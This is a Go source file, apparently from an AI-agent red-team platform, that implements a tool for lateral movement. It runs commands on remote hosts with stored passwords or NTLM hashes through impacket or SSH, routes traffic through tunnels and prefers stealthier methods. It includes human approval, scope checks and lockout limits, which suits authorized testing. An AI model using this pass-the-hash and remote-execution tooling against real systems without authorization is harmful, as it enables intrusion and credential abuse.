// lateral_exec.go 横向执行封装（P3-1）。
//
// 动机：此前 worker 做横向只能 Bash 手拼 `psexec.py -hashes :NTLM DOMAIN/user@target cmd`。
// 手拼的代价是三类可预期错误：
//  1. 凭据注入格式错（-hashes 的 LM:NT 冒号位置、域账号的 domain/user 顺序、
//     password 与 hashes 互斥）——一次错就白跑一轮，还可能把口令写进 shell 历史；
//  2. 回显解析靠模型肉眼读，成功/失败判定不稳；
//  3. 打成功了也不回写「这条凭据已验证」——凭据库的 verified 永远 false，
//     复用打分里 +25 那条规则事实失效（SetVerified 全仓库无调用方）。
//
// 本工具把这三件事收进代码：平台侧生成命令、注入已解密凭据（经临时文件，不进
// 命令行）、判定成功、成功即 SetVerified(true)。agent 只提供「用哪条凭据打谁」。
//
// 安全边界：
//   - 默认 ask 审批（与 guard 内置规则 psexec/wmiexec 同档）；
//   - 目标 host 过 RoE 任务范围校验；
//   - 凭据经 0600 临时文件传给 impacket，命令行 ps 不可见，用完即删；
//   - 只允许清单里已登记的方法，不做任意命令拼接。
package server

import (
	"context"
	"encoding/json"
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"

	"chengjian.local/chengjian/agent"
	"chengjian.local/chengjian/capability"
	"chengjian.local/chengjian/db"
	"github.com/Autumn-27/norma/permission"
	"github.com/Autumn-27/norma/procguard"
	actool "github.com/Autumn-27/norma/tool"
)

// lateralMethods 是允许的横向方法 → impacket 脚本名。
//
// 只收 impacket 家族：它们对哈希/票据/明文三类凭据都有统一入口，
// 且已在军火库清单里钉版（tools/manifest.json 的 impacket 条目）。
var lateralMethods = map[string]string{
	"psexec":   "psexec.py",
	"wmiexec":  "wmiexec.py",
	"smbexec":  "smbexec.py",
	"atexec":   "atexec.py",
	"dcomexec": "dcomexec.py",
}

// lateralDefaultTimeout 是单次横向执行的墙钟上限。横向是「打一下就完」的动作，
// 不需要长跑；超时说明目标不响应或凭据不对，早点返回让 worker 换方向。
const lateralDefaultTimeout = 90 * time.Second

// lateralMaxSameFailure 是同一凭据对同一目标+服务的「同签名失败」预算（30 分钟窗口）。
// 取 5：低于 3 会在正常排错时误拦（第一次格式错、第二次路径错都是合理尝试），
// 高于 8 则失去防止账户锁定的意义。
const lateralMaxSameFailure = 5

// lateralExecTool 是横向执行工具。
func (s *Server) lateralExecTool() actool.CoreTool {
	return actool.Build(actool.Spec{
		Name: "lateral_exec",
		Description: "【横向执行·受管】用已登记的凭据对目标主机执行一条命令。" +
			"method=ssh 走 SSH 通道（Linux 目标，支持明文口令 / SSH 私钥，返回远端**真实退出码**，目标只经隧道可达时自动走任务选路）；" +
			"其余 method 走 impacket（Windows：psexec/wmiexec/smbexec/atexec/dcomexec），目标只经隧道可达时经 proxychains 把 SMB/DCOM 流量挂到任务隧道（结果里 via=socks）。" +
			"平台侧负责：解密凭据→按凭据类型与 impacket 官方 CLI 契约拼参数→执行→判定成功→成功即把该凭据标记为已验证。" +
			"已知边界（诚实声明）：impacket CLI 无 env/stdin 凭据入口，口令/hash 会出现在平台本地进程参数（ps 可见）；日志与审计不记 secret。" +
			"**优先用它，不要用 Bash 手拼 psexec.py 或 ssh**：手拼容易错 -hashes 格式、域账号顺序、身份与目标的合并操作数，且不会回写凭据验证状态、不进认证账本。" +
			"目标必须在 RoE 任务范围内；本动作属高动静，会过 guard 人工审批。" +
			"impacket 缺失时返回明确安装指引（ssh 不需要 impacket）；任务处于内网期但无存活隧道时直接拒绝（禁止从平台直连内网目标）。",
		Schema: map[string]any{
			"type": "object",
			"properties": map[string]any{
				"credential_id": map[string]any{"type": "integer", "description": "list_credentials 返回的凭据 id（必填）"},
				"target":        strParam("目标主机 IP 或 hostname（必填，会过 RoE 范围校验）。ssh 可带端口 host:2222，默认 22"),
				"command":       strParam("要在目标上执行的命令（必填）。wmiexec/atexec 支持任意命令；psexec 会落服务，注意 OPSEC"),
				"method":        strParam("横向方法：ssh（Linux，推荐）/ wmiexec（Windows 默认，更隐蔽）/ psexec / smbexec / atexec / dcomexec"),
				"timeout":       map[string]any{"type": "integer", "description": "超时秒数（可选，默认 90）"},
			},
			"required": []any{"credential_id", "target", "command"},
		},
		ReadOnly: func(json.RawMessage) bool { return false },
		// 默认 ask：横向是高动静动作，必须人工确认（与 guard 内置规则同档）。
		Permissions: func(_ context.Context, _ json.RawMessage, _ permission.Context) permission.Decision {
			return permission.AskUser("横向执行（psexec/wmiexec 等）会留下服务/进程痕迹，确认在授权范围内执行")
		},
		Run: func(ctx context.Context, in json.RawMessage, tc *actool.ToolContext) (actool.Result, error) {
			var a struct {
				CredentialID int64  `json:"credential_id"`
				Target       string `json:"target"`
				Command      string `json:"command"`
				Method       string `json:"method"`
				Timeout      int    `json:"timeout"`
			}
			_ = json.Unmarshal(in, &a)
			if a.CredentialID <= 0 || strings.TrimSpace(a.Target) == "" || strings.TrimSpace(a.Command) == "" {
				return actool.Errorf("credential_id / target / command 均为必填"), nil
			}
			ri := agent.RunInfoFrom(ctx)
			if ri.TaskID <= 0 {
				return actool.Errorf("lateral_exec 必须在任务上下文内使用（非任务运行无归属）"), nil
			}

			method := strings.ToLower(strings.TrimSpace(a.Method))
			if method == "" {
				method = "wmiexec" // 默认选更隐蔽的 wmiexec，而非落服务的 psexec
			}
			// ssh 不是 impacket 脚本，是独立的协议实现（T-08）：它有自己的
			// 认证方式（口令/私钥）、真实退出码，以及「经隧道选路」的要求。
			// 分支放在查脚本表之前，避免把 ssh 误报成「不支持的 method」。
			isSSH := method == lateralSSHMethod
			script, ok := lateralMethods[method]
			if !isSSH && !ok {
				return actool.Errorf(fmt.Sprintf("不支持的 method %q（ssh / psexec / wmiexec / smbexec / atexec / dcomexec）", method)), nil
			}

			// RoE 范围校验：横向目标必须在任务授权范围内。
			if warn, roeErr := s.roeCheckHost(ctx, a.Target); roeErr != nil {
				return actool.Errorf(roeErr.Error()), nil
			} else if warn != "" {
				// warn 模式只告警不拦，把告警带进结果让 worker 知道。
				_ = warn
			}

			// 取凭据（需要解密后的明文 secret）。
			cred, err := s.credStore.Get(ctx, a.CredentialID)
			if err != nil || cred == nil {
				return actool.Errorf(fmt.Sprintf("凭据 #%d 不存在或读取失败", a.CredentialID)), nil
			}
			if cred.TaskID != ri.TaskID {
				return actool.Errorf(fmt.Sprintf("凭据 #%d 不属于本任务（跨任务凭据不可用）", a.CredentialID)), nil
			}

			// 尝试预算（T-07）：同一凭据对同一目标+服务、在窗口内以同一签名失败
			// 超过阈值，就不再发包。理由是重复失败不会改变结果，却可能触发账户
			// 锁定——那是不可逆的副作用，比少试一次代价大得多。
			if s.m != nil && s.m.pg != nil {
				n, sig, ferr := db.NewAuthAttemptStore(s.m.pg).RecentFailures(ctx, cred.ID, method, a.Target, 30*time.Minute)
				if ferr == nil && n >= lateralMaxSameFailure {
					s.recordAuthAttempt(ctx, db.AuthAttempt{
						TaskID: ri.TaskID, CredentialID: cred.ID, Principal: cred.Username,
						Service: method, Target: a.Target, AuthMethod: cred.CredType,
						Outcome: db.AuthOutcomeBlocked, FailureSignature: sig,
						Evidence: fmt.Sprintf("30 分钟内同签名失败 %d 次，已达预算", n),
					})
					return actool.Errorf(fmt.Sprintf(
						"尝试预算已用尽（未发包）：凭据 #%d 对 %s 的 %s 在 30 分钟内已失败 %d 次，最近失败签名 %q。"+
							"继续试同一组合不会改变结果，且可能触发账户锁定。换凭据、换方法，或先确认失败原因（签名相同=同一种拒绝）。",
						cred.ID, a.Target, method, n, sig)), nil
				}
			}

			timeout := lateralDefaultTimeout
			if a.Timeout > 0 {
				timeout = time.Duration(a.Timeout) * time.Second
			}

			// SSH 分支（T-08）：不需要 impacket，也不需要拼 -hashes。放在预算
			// 检查之后，让 SSH 同样受「同一失败不无限重试」保护。
			if isSSH {
				out, serr := s.runLateralSSH(ctx, ri, cred, a.Target, a.Command, timeout)
				if serr != nil {
					return actool.Errorf(serr.Error()), nil
				}
				if body, ok := out["output"].(string); ok {
					out["output"] = actool.Capture(tc, body)
				}
				return jsonResult(out)
			}

			// 定位 impacket 脚本。
			impacketDir, err := s.impacketDir()
			if err != nil {
				return actool.Errorf(err.Error()), nil
			}

			// 目标选路（与 SSH 分支同一套 RouteForTaskHost）：目标只经隧道可达时
			// impacket 必须挂 socks（impacket 无原生代理参数，经 proxychains 转发，
			// 见 lateral_route.go）；内网期无存活隧道直接拒绝——从平台直连内网
			// 目标既打不中又暴露平台位置，这是技术约束不是提示词建议。
			route := TaskRoute{Mode: UpstreamGlobal}
			if s.m != nil && s.m.taskProxy != nil {
				targetHost := a.Target
				if h, _, perr := net.SplitHostPort(a.Target); perr == nil && h != "" {
					targetHost = h
				}
				route = s.m.taskProxy.RouteForTaskHost(ri.TaskID, targetHost)
			}
			pcPath, pcConf := "", ""
			switch route.Mode {
			case UpstreamBlocked:
				return actool.Errorf("任务处于内网期但没有存活隧道（上游已阻断）：横向目标禁止从平台直连。" +
					"先恢复链路（tunnel_list 看状态，等自动重拉或重新 tunnel_deploy），隧道 alive 后再执行横向"), nil
			case UpstreamTunnel:
				var pcErr error
				pcPath, pcErr = locateProxychains(s.m.dir)
				if pcErr != nil {
					return actool.Errorf(pcErr.Error()), nil
				}
				conf, cleanup, cerr := writeProxychainsConf(route.Upstream)
				if cerr != nil {
					return actool.Errorf("构造 proxychains 配置失败：" + cerr.Error()), nil
				}
				pcConf = conf
				defer cleanup()
				log.Printf("[lateral] 横向执行经隧道（%s → %s，proxychains=%s）", a.Target, redactURL(route.Upstream), pcPath)
			}

			// 组装凭据参数（单操作数含目标，impacket 官方 CLI 契约）。
			authArgs, err := lateralAuthArgs(cred, a.Target)
			if err != nil {
				return actool.Errorf(err.Error()), nil
			}

			// 脚本解析为 argv 前缀：venv 入口直接执行；源码 clone 走
			// python3 + examples/ 绝对路径。不再依赖服务工作目录。
			argv, serr := resolveImpacketScript(impacketDir, script)
			if serr != nil {
				return actool.Errorf(serr.Error()), nil
			}

			runCtx, cancel := context.WithTimeout(ctx, timeout)
			defer cancel()

			// 命令行 = 脚本 argv 前缀 + 认证参数（含目标）+ 命令。
			// 诚实声明：口令/hash 在本地进程参数中可见（impacket CLI 无
			// env/stdin 入口）；日志与审计不记 secret。
			// 经隧道时外面套一层 proxychains -q -f conf：钩住全部 connect() 与
			// DNS，覆盖 SMB 445 与 DCOM 动态端口——逐端口映射覆盖不了后者。
			full := append(append([]string{}, argv...), authArgs...)
			full = append(full, a.Command)
			var cmd *exec.Cmd
			if pcPath != "" {
				cmd = exec.CommandContext(runCtx, pcPath, append([]string{"-q", "-f", pcConf}, full...)...)
			} else {
				cmd = exec.CommandContext(runCtx, full[0], full[1:]...)
			}
			var buffer procguard.Buffer
			cmd.Stdout, cmd.Stderr = &buffer, &buffer
			cmd.WaitDelay = 2 * time.Second
			runErr := procguard.Run(runCtx, cmd)
			fullOutput := string(buffer.Bytes())
			output := actool.Capture(tc, fullOutput)
			if buffer.Overflow {
				return actool.Errorf("output_limit_exceeded：输出超过 8MiB，命令可能已执行，结果不完整；不要盲目重跑\n" + output), nil
			}

			if runCtx.Err() == context.DeadlineExceeded {
				s.recordAuthAttempt(ctx, db.AuthAttempt{
					TaskID: ri.TaskID, CredentialID: cred.ID, Principal: cred.Username,
					Service: method, Target: a.Target, AuthMethod: cred.CredType,
					Outcome: db.AuthOutcomeError, FailureSignature: "timeout",
					Evidence: "lateral_exec 超时（未取得可判定回显）",
				})
				s.appendIntranetActivity(ri.TaskID, "lateral_exec",
					fmt.Sprintf("横向执行超时：%s → %s（%s）", cred.Username, a.Target, method),
					fmt.Sprintf("credential_id=%d target=%s method=%s timeout=%s", cred.ID, a.Target, method, timeout))
				return jsonResult(func() map[string]any {
					m := map[string]any{
						"ok": false, "timed_out": true, "method": method, "target": a.Target,
						"output": output,
						"note":   "超时只说明本次没拿到回显；可能是目标不可达、凭据不对或命令过长。不代表凭据无效。",
					}
					// 超时归 partial 而不是 failed：命令可能已经在目标上跑起来了，
					// 只是我们没等到结果。归 failed 会让「命令其实成功了」被记成失败，
					// 进而触发重试——在目标上重复执行一条已生效的命令，风险更大。
					if c, cerr := capability.NewToolResult(capability.StatusPartial, capability.ReasonTimeout,
						"超时：无法判定命令是否在目标上完成；不要据此判定凭据无效，也不要盲目重跑。",
						truncateForSnapshot(output, 300)); cerr == nil {
						for k, v := range contractFields(c) {
							m[k] = v
						}
					}
					return m
				}())
			}

			// 判定成功：impacket 退出码 0 且输出里没有明显的失败签名。
			failSig, hasFailSig := lateralFailureReason(fullOutput)
			succeeded := runErr == nil && !hasFailSig
			if succeeded {
				// 关键闭环：打成功 = 这条凭据已验证。此前 SetVerified 无调用方，
				// 凭据库的 verified 永远是 false，复用打分 +25 规则事实失效。
				if verr := s.credStore.SetVerified(ctx, cred.ID, true); verr != nil {
					// 回写失败不影响本次结论，但要留日志（否则「明明打成功却还是未验证」查不出来）。
					s.appendIntranetActivity(ri.TaskID, "lateral_exec",
						fmt.Sprintf("凭据 #%d 验证状态回写失败：%v", cred.ID, verr), "")
				}
			}
			// 认证账本（T-07）：成功与失败都记。这是「verified 有证据支撑」的写侧，
			// 也是「同一失败原因反复试」的统计来源。
			outcome := db.AuthOutcomeFailure
			sig := failSig
			if succeeded {
				outcome, sig = db.AuthOutcomeSuccess, ""
			} else if !hasFailSig && runErr != nil {
				// 没有失败签名但退出码非 0：多半是环境问题（python 缺失、脚本报错），
				// 记 error 而不是 failure——否则会污染「凭据无效」的统计。
				outcome, sig = db.AuthOutcomeError, "exit_nonzero"
			}
			s.recordAuthAttempt(ctx, db.AuthAttempt{
				TaskID: ri.TaskID, CredentialID: cred.ID, Principal: cred.Username,
				Service: method, Target: a.Target, AuthMethod: cred.CredType,
				Outcome: outcome, FailureSignature: sig,
				Evidence: truncateForSnapshot(output, 600),
			})

			s.appendIntranetActivity(ri.TaskID, "lateral_exec",
				fmt.Sprintf("横向执行%s：%s → %s（%s）", map[bool]string{true: "成功", false: "失败"}[succeeded],
					cred.Username, a.Target, method),
				fmt.Sprintf("credential_id=%d target=%s method=%s ok=%v",
					cred.ID, a.Target, method, succeeded))

			out2 := map[string]any{
				"ok": succeeded, "method": method, "target": a.Target,
				"credential_id": cred.ID, "username": cred.Username,
				"output": output,
			}
			if pcPath != "" {
				out2["via"] = "socks" // 只说明走了隧道，不暴露 socks 口令
			}
			// 三段式合同（T-15）：impacket 只有本地进程退出码，所以「成功」的
			// 判据只能是「没命中失败签名」，并把这一点写进 assessment——不要
			// 让调用方以为这里拿到了远端真实退出码。
			cstatus, creason := capability.StatusSucceeded, capability.ReasonNone
			if !succeeded {
				cstatus = capability.StatusFailed
				creason = lateralReasonForSignature(sig)
				if creason == capability.ReasonUnknown {
					creason = capability.ReasonEnvironment // 退出码非 0 且无签名：多半是脚本/环境问题
				}
			}
			if c, cerr := capability.NewToolResult(cstatus, creason,
				"impacket 返回的是本地脚本退出码，不是远端命令的真实退出码；结论以失败签名为准。",
				truncateForSnapshot(output, 400)); cerr == nil {
				for k, v := range contractFields(c) {
					out2[k] = v
				}
			}
			if succeeded {
				out2["credential_verified"] = true
				out2["note"] = "执行成功，该凭据已标记为已验证（后续 credential_reuse_plan 会加分）"
			} else {
				out2["note"] = "执行失败。若输出是认证失败，说明凭据不适用于该目标（不要重复同一组合）；" +
					"若是连接类错误，检查隧道/网络可达性"
			}
			return jsonResult(out2)
		},
	})
}

// lateralAuthArgs 按凭据类型组装 impacket 认证参数（含目标）。
//
// impacket 各 exec 脚本（psexec/wmiexec/smbexec/atexec/dcomexec）共享同一个
// target 解析器：认证信息与目标是**一个操作数**，不是分开的两个参数：
//
//	wmiexec.py [-hashes LM:NT] domain/user:password@target [command]
//	wmiexec.py [-hashes LM:NT] domain/user@target [command]
//
// 之前的实现把身份与目标拆成两个参数（"user:pass" + "target"），与官方 CLI
// 契约不符——这是外部评审确认的接口拼装错误，本函数已改为合并操作数。
//
// 诚实声明（不再用误导性注释）：impacket CLI 没有 env/stdin 凭据入口，
// 口令与 hash **必然出现在本地进程参数**（ps 可见）。平台的缓解只有：
// 审计/活动日志不记 secret；目标已是立足点（凭据本就来自被控环境）。
// "临时文件兜底删除"的旧注释不符合实际行为，已删除。
func lateralAuthArgs(cred *db.CredentialRecord, target string) ([]string, error) {
	user := cred.Username
	if cred.Domain != "" {
		user = cred.Domain + "/" + cred.Username // impacket 用 domain/user，不是 domain\user
	}
	switch cred.CredType {
	case db.CredPassword:
		if strings.TrimSpace(cred.Secret) == "" {
			return nil, fmt.Errorf("凭据 #%d 是明文类型但 secret 为空", cred.ID)
		}
		// 单操作数：domain/user:password@target。口令里含 @ 会破坏解析——
		// 如实报错让调用方换 hash 或经会话执行，而不是拼出必错的命令行。
		if strings.ContainsAny(cred.Secret, "@\r\n") || strings.ContainsAny(target, "@\r\n") {
			return nil, fmt.Errorf("口令或目标含 @/换行，无法安全拼进 impacket 单操作数 %q@%q：改用 hash 凭据或 session_exec", user, target)
		}
		return []string{user + ":" + cred.Secret + "@" + target}, nil
	case db.CredHashNT:
		h := strings.TrimSpace(cred.Secret)
		if h == "" {
			return nil, fmt.Errorf("凭据 #%d 是 NT hash 类型但 secret 为空", cred.ID)
		}
		// -hashes 的格式是 LM:NT；只有 NT 时 LM 留空。
		if !strings.Contains(h, ":") {
			h = ":" + h
		}
		return []string{"-hashes", h, user + "@" + target}, nil
	case db.CredHashLM:
		h := strings.TrimSpace(cred.Secret)
		if !strings.Contains(h, ":") {
			h = h + ":" // 只有 LM 时 NT 留空
		}
		return []string{"-hashes", h, user + "@" + target}, nil
	case db.CredTicket, db.CredSSHKey, db.CredToken:
		return nil, fmt.Errorf("凭据 #%d 类型为 %s：lateral_exec 暂只支持 password / hash_nt / hash_lm。"+
			"票据类请用 Kerberos 流程（export KRB5CCNAME 后走 klist/impacket -k），SSH key 请用 method=ssh", cred.ID, cred.CredType)
	default:
		return nil, fmt.Errorf("凭据 #%d 类型 %q 不支持横向执行", cred.ID, cred.CredType)
	}
}

// resolveImpacketScript 解析脚本到可执行的 argv 前缀。
//
// 两种部署形态都要支持（manifest 同时允许）：
//   - venv 安装（pip install impacket）：tools/postx-venv/bin/wmiexec 是
//     console script 入口，直接执行；
//   - 源码 clone：tools/impacket/examples/wmiexec.py，需要 python3 + 绝对路径
//     （旧实现跑 `python3 wmiexec.py` 裸名——依赖服务工作目录恰好在 impacket
//     目录，目录检查形同虚设，这是评审确认的第二个接口错误）。
//
// 返回的 argv 前缀与后续认证参数、命令拼接为完整命令行。
func resolveImpacketScript(impacketDir, script string) ([]string, error) {
	direct := filepath.Join(impacketDir, script)
	if st, err := os.Stat(direct); err == nil && !st.IsDir() {
		return []string{direct}, nil // venv console script：自身可执行
	}
	withExamples := filepath.Join(impacketDir, "examples", script)
	if st, err := os.Stat(withExamples); err == nil && !st.IsDir() {
		return []string{"python3", withExamples}, nil
	}
	return nil, fmt.Errorf("impacket 脚本 %s 未找到（查过 %s 与其 examples/ 子目录）。"+
		"pip 安装的部署应存在 bin/wmiexec 入口；源码部署应存在 examples/wmiexec.py。"+
		"按 packaging/tools-manifest.json 的 impacket 条目修正部署", script, impacketDir)
}

// lateralFailureSignature 识别 impacket 输出里的常见失败签名。
// 退出码为 0 但输出含这些串时仍判失败——impacket 有时把错误打在 stdout 且不返非零。
// lateralFailureSignature 报告输出里是否含失败特征。保留布尔形式给旧调用方，
// 内部改由 lateralFailureReason 给出具体签名——签名进认证账本后，才能识别
// 「同一失败原因反复试」。
func lateralFailureSignature(out string) bool {
	_, hit := lateralFailureReason(out)
	return hit
}

// lateralFailureReason 返回命中的第一个失败签名。
//
// 签名取「最短可判定片段」而不是整句：impacket 的输出随版本/语言变化，整句
// 匹配会漏；而 logon failure / access is denied 这类短语跨版本稳定。
func lateralFailureReason(out string) (string, bool) {
	low := strings.ToLower(out)
	for _, sig := range []string{
		"logon failure", "access is denied", "rpc_s_access_denied",
		"status_logon_failure", "status_account_locked_out",
		"authentication failed", "invalid credentials",
		"connection refused", "no route to host", "timed out",
		"traceback (most recent call last)", // python 异常 = 参数拼错
	} {
		if strings.Contains(low, sig) {
			return sig, true
		}
	}
	return "", false
}

// recordAuthAttempt 把一次横向认证尝试写进账本（T-07）。
//
// 失败只记日志不改变本次结论：账本是旁路证据，不能因为写不进去就让一次已经
// 成功的执行变成失败——那会让 agent 重打一遍，代价远高于丢一条记录。
func (s *Server) recordAuthAttempt(ctx context.Context, a db.AuthAttempt) {
	if s.m == nil || s.m.pg == nil {
		return
	}
	if _, err := db.NewAuthAttemptStore(s.m.pg).Record(ctx, a); err != nil {
		log.Printf("[lateral] 认证账本写入失败（不影响本次结论）: %v", err)
	}
}

// impacketDir 定位军火库里的 impacket 目录（tools/manifest.json 的 impacket 条目）。
func (s *Server) impacketDir() (string, error) {
	dataDir := s.m.dir
	// manifest 的 path 是相对 data 目录的。
	candidates := []string{
		filepath.Join(dataDir, "tools", "impacket"),
		filepath.Join(dataDir, "tools", "postx-venv", "bin"),
	}
	for _, c := range candidates {
		if st, err := os.Stat(c); err == nil && st.IsDir() {
			return c, nil
		}
	}
	return "", fmt.Errorf("未找到 impacket（期望 %s 或 %s）。"+
		"请按 packaging/tools-manifest.json 的 impacket 条目部署，或改用 session_exec 经立足点执行", candidates[0], candidates[1])
}
